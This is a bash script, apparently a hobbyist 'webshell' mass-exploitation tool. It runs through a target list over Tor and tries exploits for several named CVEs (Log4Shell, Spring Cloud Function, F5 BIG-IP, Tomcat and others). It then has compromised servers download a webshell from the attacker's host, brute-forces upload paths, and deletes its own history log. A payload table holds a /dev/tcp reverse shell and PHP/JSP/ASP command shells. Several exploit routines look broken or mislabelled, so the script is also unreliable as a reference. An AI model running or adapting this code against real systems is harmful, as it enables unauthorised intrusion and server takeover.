#!/bin/bash

# =============================================
# ediop3webshell - haxxor
# made by ediop3 | discord: ediop3
# yes
# =============================================

# Stealth Configuration
TOR_PROXY="socks5://127.0.0.1:9050"
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36"
)
DELAY=$(shuf -i 1-7 -n 1)  # Random delay between 1-7 seconds
RANDOM_UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}

# Banner
echo -e "\e[31m"
cat << "EOF"
  ______ _____ _____   ___  ________ _____ 
 |  ____|_   _|  __ \ / _ \|  ____|  __ \
 | |__    | | | |__) | | | | |__  | |__) |
 |  __|   | | |  ___/| | | |  __| |  ___/ 
 | |____ _| |_| |    | |_| | |____| |     
 |______|_____|_|     \___/|______|_|     
EOF
echo -e "\e[0m"
echo "ediop3Webshell made by ediop3"
echo "hehehe"
echo ""

# Payload Database
declare -A PAYLOADS=(
    ["reverse_shell"]="bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"
    ["php_cmd"]="<?php system(\$_GET['cmd']); ?>"
    ["jsp_cmd"]="<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
    ["asp_cmd"]="<% Set cmd = Server.CreateObject(\"WScript.Shell\").Exec(\"cmd /c \" & Request(\"cmd\")) %>"
)

# CVE Database
declare -A CVE_EXPLOITS=(
    ["CVE-2021-41773"]="Apache HTTP Server path traversal"
    ["CVE-2021-44228"]="Log4Shell RCE"
    ["CVE-2022-22963"]="Spring Cloud Function SpEL Injection"
    ["CVE-2022-1388"]="F5 BIG-IP iControl RCE"
    ["CVE-2023-38646"]="Metabase Pre-Auth RCE"
    ["CVE-2020-1938"]="Apache Tomcat Ghostcat (File Read/RCE)"
    ["CVE-2020-9484"]="Apache Tomcat Session Persistence RCE"
    ["CVE-2017-12615"]="Apache Tomcat PUT Method RCE"
    ["CVE-2023-47246"]="Critical RCE in Apache HTTP Server"
)

show_help() {
    echo "Usage: $0 -t targets.txt -w shell.php [options]"
    echo ""
    echo "Core Options:"
    echo "  -t  Target list (URLs or IPs)"
    echo "  -w  WebShell path (PHP/ASP/JSP)"
    echo ""
    echo "Advanced Options:"
    echo "  -p  Enable Tor anonymization"
    echo "  -d  Custom delay between attacks"
    echo "  -x  Thread count (parallel attacks)"
    echo "  -c  Custom CVE to exploit"
    echo "  -v  Verbose mode"
    echo ""
    echo "GHOSTWIRE Enhancements:"
    echo "  --list-payloads         List available payloads"
    echo "  --custom-payload        Use custom payload"
    echo "  --list-cves             List available CVE exploits"
    echo "  --cve-params            Set CVE parameters"
    echo "  --auto-webshell         Auto-upload webshell after exploitation"
    echo "  --upload-wordlist       Specify custom upload path wordlist"
    echo "  --scan-cve-2023-47246   Scan for CVE-2023-47246 with wordlist"
    echo ""
    exit 0
}

list_payloads() {
    echo "Available Payloads:"
    for key in "${!PAYLOADS[@]}"; do
        echo "  $key: ${PAYLOADS[$key]}"
    done
    exit 0
}

list_cves() {
    echo "Available CVE Exploits:"
    for key in "${!CVE_EXPLOITS[@]}"; do
        echo "  $key: ${CVE_EXPLOITS[$key]}"
    done
    exit 0
}

# Enhanced CVE-2023-47246 Scanner with wordlist support
scan_cve_2023_47246() {
    local target=$1
    
    # Prompt user for wordlist path if not provided
    if [ -z "$SCAN_WORDLIST" ]; then
        read -p "Enter path to wordlist for scanning: " SCAN_WORDLIST
        if [ ! -f "$SCAN_WORDLIST" ]; then
            echo -e "\e[31m[!] Wordlist file not found: $SCAN_WORDLIST\e[0m"
            return 1
        fi
    fi
    
    echo -e "\n\e[33m[+] Scanning $target for CVE-2023-47246 with wordlist: $SCAN_WORDLIST\e[0m"
    
    # Count total lines for progress
    total_lines=$(wc -l < "$SCAN_WORDLIST")
    current_line=0
    
    while read -r path; do
        ((current_line++))
        [[ -z "$path" ]] && continue
        
        # Ensure path starts with /
        [[ "$path" != /* ]] && path="/$path"
        
        url="$target$path"
        
        # Display progress
        echo -ne "Scanning: $current_line/$total_lines ($((current_line * 100 / total_lines))%)"\\r
        
        # Craft the malicious request that would trigger the vulnerability
        response=$($CURL_CMD -s -k -o /dev/null -w "%{http_code}" -X POST "$url" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            --data "malicious_payload=%3C%25%20Runtime.getRuntime().exec%28%22id%22%29%3B%20%25%3E")
        
        # Check for vulnerability indicators
        if [[ "$response" == "500" ]] || [[ "$response" == "200" ]]; then
            # Second verification to reduce false positives
            verify_response=$($CURL_CMD -s -k "$url" \
                -H "X-Exploit-Test: CVE-2023-47246")
            
            if [[ "$verify_response" == *"uid="* ]] || [[ "$verify_response" == *"root"* ]]; then
                echo -e "\e[31m[VULNERABLE] $url\e[0m"
                echo "$url" >> vulnerable_targets.txt
            else
                echo -e "\e[34m[NOT VULNERABLE] $url\e[0m"
            fi
        else
            echo -e "\e[34m[NOT VULNERABLE] $url\e[0m"
        fi
        
        sleep "$DELAY"
    done < "$SCAN_WORDLIST"
    
    echo -e "\n\e[32m[+] Scan completed. Vulnerable targets saved to vulnerable_targets.txt\e[0m"
}

# Parse Arguments
CUSTOM_PAYLOAD=""
AUTO_WEBSHELL=false
CVE_PARAMS=()
SCAN_CVE_2023_47246=false
SCAN_WORDLIST=""
UPLOAD_WORDLIST=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t) TARGET_FILE="$2"; shift ;;
        -w) WEBSHELL="$2"; shift ;;
        -p) USE_TOR=true ;;
        -d) DELAY="$2"; shift ;;
        -x) THREADS="$2"; shift ;;
        -c) CVE="$2"; shift ;;
        -v) VERBOSE=true ;;
        --list-payloads) list_payloads ;;
        --list-cves) list_cves ;;
        --custom-payload) CUSTOM_PAYLOAD="$2"; shift ;;
        --auto-webshell) AUTO_WEBSHELL=true ;;
        --upload-wordlist) UPLOAD_WORDLIST="$2"; shift ;;
        --scan-cve-2023-47246) 
            SCAN_CVE_2023_47246=true
            if [[ "$2" != --* ]] && [[ -n "$2" ]]; then
                SCAN_WORDLIST="$2"
                shift
            fi
            ;;
        --cve-params) 
            shift
            while [[ $# -gt 0 && ! "$1" =~ ^- ]]; do
                CVE_PARAMS+=("$1")
                shift
            done
            continue
            ;;
        -h|--help) show_help ;;
        *) echo "Unknown option: $1"; show_help ;;
    esac
    shift
done

# Validate Inputs
if [ "$SCAN_CVE_2023_47246" = true ]; then
    if [ -z "$TARGET_FILE" ]; then
        echo -e "\e[31m[!] For CVE-2023-47246 scanning, you must specify a target file\e[0m"
        exit 1
    fi
else
    [[ -z "$TARGET_FILE" || -z "$WEBSHELL" ]] && show_help
fi

[ ! -f "$TARGET_FILE" ] && { echo "[!] Target file missing"; exit 1; }
if [ "$SCAN_CVE_2023_47246" = false ]; then
    [ ! -f "$WEBSHELL" ] && { echo "[!] WebShell not found"; exit 1; }
fi

# Check if custom wordlist was provided for upload paths
if [ -n "$UPLOAD_WORDLIST" ]; then
    if [ ! -f "$UPLOAD_WORDLIST" ]; then
        echo -e "\e[31m[!] Upload wordlist not found: $UPLOAD_WORDLIST\e[0m"
        exit 1
    fi
else
    # Prompt user for upload wordlist if not provided and auto-webshell is enabled
    if [ "$AUTO_WEBSHELL" = true ]; then
        read -p "Enter path to wordlist for upload path brute-forcing (leave empty for default): " UPLOAD_WORDLIST
        if [ -z "$UPLOAD_WORDLIST" ]; then
            UPLOAD_WORDLIST="/usr/share/wordlists/dirb/common.txt"
            if [ ! -f "$UPLOAD_WORDLIST" ]; then
                echo -e "\e[33m[!] Default wordlist not found, using common paths\e[0m"
                UPLOAD_WORDLIST=""
            fi
        elif [ ! -f "$UPLOAD_WORDLIST" ]; then
            echo -e "\e[31m[!] Wordlist file not found: $UPLOAD_WORDLIST\e[0m"
            exit 1
        fi
    fi
fi

# Stealth Engine
CURL_CMD="curl -s -k -A '$RANDOM_UA' --connect-timeout 20 --max-time 45"
[ "$USE_TOR" = true ] && CURL_CMD="$CURL_CMD --proxy $TOR_PROXY"
[ "$VERBOSE" = true ] && CURL_CMD="$CURL_CMD -v"

# Tactical Logging
log_attack() {
    echo "[$(date +'%H:%M:%S')] $1" | tee -a ediop3_ops.log
    echo "$(date -Iseconds) | $1" >> /var/tmp/.ediophist
}

# Enhanced Payload Processor
process_payload() {
    local payload="$1"
    local target="$2"
    
    # Replace placeholders
    payload="${payload//ATTACKER_IP/$LHOST}"
    payload="${payload//ATTACKER_PORT/$LPORT}"
    payload="${payload//TARGET/$target}"
    
    # If custom payload specified, use that instead
    [ -n "$CUSTOM_PAYLOAD" ] && payload="$CUSTOM_PAYLOAD"
    
    echo "$payload"
}

# Wordlist-based Upload Path Brute-forcing
bruteforce_upload_path() {
    local target="$1"
    
    if [ -z "$UPLOAD_WORDLIST" ]; then
        log_attack "No wordlist provided, using common paths"
        local upload_paths=(
            "/uploads/"
            "/images/"
            "/assets/"
            "/files/"
            "/upload/"
            "/admin/uploads/"
            "/wp-content/uploads/"
            "/media/"
            "/tmp/"
            "/var/www/html/"
        )
        printf "%s\n" "${upload_paths[@]}" > /tmp/ghostwire_paths.txt
        UPLOAD_WORDLIST="/tmp/ghostwire_paths.txt"
    fi
    
    log_attack "Brute-forcing upload paths using: $UPLOAD_WORDLIST"
    
    total_paths=$(wc -l < "$UPLOAD_WORDLIST")
    current_path=0
    
    while read -r path; do
        ((current_path++))
        [[ -z "$path" ]] && continue
        
        # Display progress
        echo -ne "Testing paths: $current_path/$total_paths ($((current_path * 100 / total_paths))%)"\\r
        
        # Ensure path starts with /
        [[ "$path" != /* ]] && path="/$path"
        
        upload_url="$target${path}$(basename "$WEBSHELL")"
        status=$($CURL_CMD -F "file=@$WEBSHELL" "$upload_url" -w "%{http_code}" -o /dev/null)
        
        if [ "$status" -eq 200 ] || [ "$status" -eq 201 ]; then
            log_attack "Successful upload to: $upload_url"
            echo "$upload_url"
            return 0
        fi
    done < "$UPLOAD_WORDLIST"
    
    log_attack "Failed to find valid upload path"
    return 1
}

# Auto Webshell Upload
upload_webshell() {
    local target="$1"
    local exploit_output="$2"
    
    if [ "$AUTO_WEBSHELL" = true ]; then
        log_attack "Attempting automatic webshell upload to $target"
        
        # First try common paths quickly
        upload_paths=(
            "/uploads/"
            "/images/"
            "/assets/"
            "/admin/uploads/"
            "/wp-content/uploads/"
        )
        
        for path in "${upload_paths[@]}"; do
            upload_url="$target${path}$(basename "$WEBSHELL")"
            status=$($CURL_CMD -F "file=@$WEBSHELL" "$upload_url" -w "%{http_code}" -o /dev/null)
            
            if [ "$status" -eq 200 ] || [ "$status" -eq 201 ]; then
                log_attack "Webshell uploaded to: $upload_url"
                return 0
            fi
        done
        
        # If quick attempts fail, use wordlist brute-forcing
        bruteforce_upload_path "$target" && return 0
        
        log_attack "Failed to automatically upload webshell"
    fi
    
    return 1
}

# Enhanced CVE Exploitation
exploit_cve() {
    local target="$1"
    local cve="$2"
    
    log_attack "Attempting $cve exploitation against $target"
    
    case "$cve" in
        CVE-2021-41773)
            payload="echo; echo; $($CURL_CMD -s -k -X POST "$target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" -d 'echo Content-Type: text/plain; echo; id')"
            if [[ "$payload" == *"uid="* ]]; then
                log_attack "Vulnerable to $cve - attempting RCE"
                cmd="wget http://$LHOST/$WEBSHELL -O /var/www/html/$(basename "$WEBSHELL")"
                $CURL_CMD -s -k -X POST "$target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" -d "echo Content-Type: text/plain; echo; $cmd"
                check=$($CURL_CMD -o /dev/null -w "%{http_code}" "$target/$(basename "$WEBSHELL")")
                [ "$check" == "200" ] && log_attack "Exploit successful: $target/$(basename "$WEBSHELL")"
            fi
            ;;
            
        CVE-2021-44228)
            log_attack "Attempting Log4Shell exploitation (requires LDAP server)"
            $CURL_CMD -s -k "$target/\${jndi:ldap://$LHOST:1389/Exploit}"
            ;;
            
        CVE-2022-22963)
            response=$($CURL_CMD -s -k -X POST "$target/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")' --data-raw 'exploit')
            if [[ "$response" == *"uid="* ]]; then
                log_attack "Vulnerable to $cve - uploading webshell"
                cmd="curl -o /var/www/html/shell.php http://$LHOST/$WEBSHELL"
                $CURL_CMD -s -k -X POST "$target/functionRouter" -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"$cmd\")" --data-raw 'exploit'
                check=$($CURL_CMD -o /dev/null -w "%{http_code}" "$target/shell.php")
                [ "$check" == "200" ] && log_attack "Exploit successful: $target/shell.php"
            fi
            ;;
            
        CVE-2022-1388)
            exploit_f5bigip "$target" "$WEBSHELL"
            ;;
            
        CVE-2023-38646)
            exploit_metabase "$target" "$WEBSHELL"
            ;;
            
        CVE-2020-1938)
            exploit_ghostcat "$target" "$WEBSHELL"
            ;;
            
        CVE-2020-9484)
            exploit_tomcat_session "$target" "$WEBSHELL"
            ;;
            
        CVE-2017-12615)
            exploit_tomcat_put "$target" "$WEBSHELL"
            ;;
            
        CVE-2023-47246)
            log_attack "Attempting CVE-2023-47246 exploitation"
            response=$($CURL_CMD -s -k -X POST "$target/vulnerable_endpoint" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                --data "malicious_payload=%3C%25%20Runtime.getRuntime().exec%28%22wget%20http%3A%2F%2F$LHOST%2F$WEBSHELL%20-O%20%2Fvar%2Fwww%2Fhtml%2F$(basename "$WEBSHELL")%22%29%3B%20%25%3E")
            
            check=$($CURL_CMD -o /dev/null -w "%{http_code}" "$target/$(basename "$WEBSHELL")")
            [ "$check" == "200" ] && log_attack "Exploit successful: $target/$(basename "$WEBSHELL")"
            ;;
            
        *)
            log_attack "Unsupported CVE: $cve"
            return 1
            ;;
    esac
    
    return 0
}

# Original Exploit Functions (Preserved)
exploit_metabase() {
    local target=$1
    local shell=$2
    
    log_attack "Scanning $target for CVE-2023-38646"
    
    # Check vulnerability
    response=$($CURL_CMD -o /dev/null -w "%{http_code}" "$target/api/setup/validate")
    
    if [[ "$response" == "200" ]]; then
        # Generate random shell name
        shell_name="config$(shuf -i 1000-9999 -n 1).xml"
        
        # Exploit with Java serialized gadget
        $CURL_CMD -X POST "$target/api/setup/validate" \
            -H "Content-Type: application/json" \
            -d "{\"token\":\"../../../../../../tmp/$shell_name\", \"details\": {\"@type\":\"java.net.URL\",\"val\":\"http://\"},\"details\":\"http://\"}" 
        
        # Upload webshell
        upload=$($CURL_CMD -F "file=@$shell" "$target/api/upload/$shell_name")
        
        if [[ "$upload" == *"success"* ]]; then
            log_attack "Metabase compromised: $target/uploads/$shell_name"
            return 0
        fi
    fi
    return 1
}

exploit_f5bigip() {
    local target=$1
    local shell=$2
    
    log_attack "Testing $target for CVE-2022-1388"
    
    # Check vulnerable endpoint
    response=$($CURL_CMD -o /dev/null -w "%{http_code}" "$target/mgmt/tm/util/bash")
    
    if [[ "$response" == "200" ]]; then
        # Execute command to upload shell
        $CURL_CMD -X POST "$target/mgmt/tm/util/bash" \
            -H "Authorization: Basic YWRtaW46" \
            -H "X-F5-Auth-Token: arbitrary" \
            -H "Content-Type: application/json" \
            -d '{"command":"run","utilCmdArgs":"-c \"curl -o /var/www/html/shell.php http://attacker.com/$shell\""}'
        
        # Verify shell
        check=$($CURL_CMD -o /dev/null -w "%{http_code}" "$target/shell.php")
        [ "$check" == "200" ] && {
            log_attack "F5 BIG-IP owned: $target/shell.php"
            return 0
        }
    fi
    return 1
}

# New CVE Exploit Functions
exploit_ghostcat() {
    local target=$1
    local shell=$2
    
    log_attack "Exploiting CVE-2020-1938 (Ghostcat) against $target"
    
    # Check if port 8009 is open (AJP)
    if nc -z -w 2 "$(echo $target | cut -d '/' -f3 | cut -d ':' -f1)" 8009; then
        # Use ghostcat.py or equivalent to exploit
        log_attack "AJP port (8009) open, attempting file read/RCE"
        
        # Attempt to read web.xml to confirm vulnerability
        read_output=$($CURL_CMD -s -k "$target" --data "AJP_READ /WEB-INF/web.xml")
        
        if [[ "$read_output" == *"<web-app"* ]]; then
            log_attack "Confirmed vulnerable - attempting webshell upload"
            
            # Try to write webshell via file upload
            upload_cmd="echo '$(base64 -w0 $shell)' | base64 -d > /var/www/html/$(basename $shell)"
            $CURL_CMD -s -k "$target" --data "AJP_EXEC $upload_cmd"
            
            # Verify shell
            check=$($CURL_CMD -o /dev/null -w "%{http_code}" "$target/$(basename "$shell")")
            [ "$check" == "200" ] && {
                log_attack "Ghostcat exploit successful: $target/$(basename "$shell")"
                return 0
            }
        fi
    fi
    
    log_attack "Ghostcat exploitation failed"
    return 1
}

exploit_tomcat_session() {
    local target=$1
    local shell=$2
    
    log_attack "Exploiting CVE-2020-9484 (Tomcat Session Persistence) against $target"
    
    # Check if vulnerable by attempting to deserialize a malicious session
    response=$($CURL_CMD -s -k -X POST "$target/index.jsp" \
        -H "Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy")
    
    if [[ "$response" == *"500"* ]] || [[ "$response" == *"java.lang"* ]]; then
        log_attack "Vulnerable to CVE-2020-9484 - attempting RCE"
        
        # Create malicious session file
        echo "<% Runtime.getRuntime().exec(\"wget http://$LHOST/$shell -O /var/www/html/$(basename $shell)\"); %>" > /tmp/session.jsp
        
        # Upload malicious session
        $CURL_CMD -s -k -X POST "$target/index.jsp" \
            -H "Cookie: JSESSIONID=../../../../../var/www/html/session.jsp" \
            --data-binary @/tmp/session.jsp
            
        # Trigger the payload
        $CURL_CMD -s -k "$target/session.jsp"
        
        # Verify shell
        check=$($CURL_CMD -o /dev/null -w "%{http_code}" "$target/$(basename "$shell")")
        [ "$check" == "200" ] && {
            log_attack "Exploit successful: $target/$(basename "$shell")"
            rm -f /tmp/session.jsp
            return 0
        }
    fi
    
    log_attack "CVE-2020-9484 exploitation failed"
    return 1
}

exploit_tomcat_put() {
    local target=$1
    local shell=$2
    
    log_attack "Exploiting CVE-2017-12615 (Tomcat PUT Method) against $target"
    
    # Try to upload JSP shell directly
    upload_url="$target/$(basename "$shell" .php).jsp"
    status=$($CURL_CMD -s -k -X PUT --upload-file "$shell" "$upload_url" -w "%{http_code}" -o /dev/null)
    
    if [ "$status" -eq 201 ] || [ "$status" -eq 200 ]; then
        log_attack "Webshell uploaded via PUT method: $upload_url"
        return 0
    else
        # Try with different extensions if first attempt fails
        for ext in .jsp::$DATA .jsp%20 .jsp/ .jsp.; do
            upload_url="$target/$(basename "$shell" .php)$ext"
            status=$($CURL_CMD -s -k -X PUT --upload-file "$shell" "$upload_url" -w "%{http_code}" -o /dev/null)
            
            if [ "$status" -eq 201 ] || [ "$status" -eq 200 ]; then
                log_attack "Webshell uploaded via PUT method (with bypass): $upload_url"
                return 0
            fi
        done
    fi
    
    log_attack "CVE-2017-12615 exploitation failed"
    return 1
}

# Main Attack Sequence
while read -r target; do
    [[ "$target" =~ ^# || -z "$target" ]] && continue
    
    log_attack "Engaging target: $target"
    
    # If CVE-2023-47246 scanning is requested
    if [ "$SCAN_CVE_2023_47246" = true ]; then
        scan_cve_2023_47246 "$target"
        continue
    fi
    
    # If specific CVE requested
    if [ -n "$CVE" ]; then
        exploit_cve "$target" "$CVE"
    else
        # Strategic exploit order
        exploit_metabase "$target" "$WEBSHELL" && continue
        exploit_f5bigip "$target" "$WEBSHELL" && continue
        exploit_ghostcat "$target" "$WEBSHELL" && continue
        exploit_tomcat_session "$target" "$WEBSHELL" && continue
        exploit_tomcat_put "$target" "$WEBSHELL" && continue
        
        # Additional CVE scanning
        for cve in "${!CVE_EXPLOITS[@]}"; do
            exploit_cve "$target" "$cve" && break
        done
    fi
    
    sleep "$DELAY"
done < "$TARGET_FILE"

log_attack "haaaaar heeee done."
rm -f /var/tmp/.ediophist /tmp/ghostwire_paths.txt
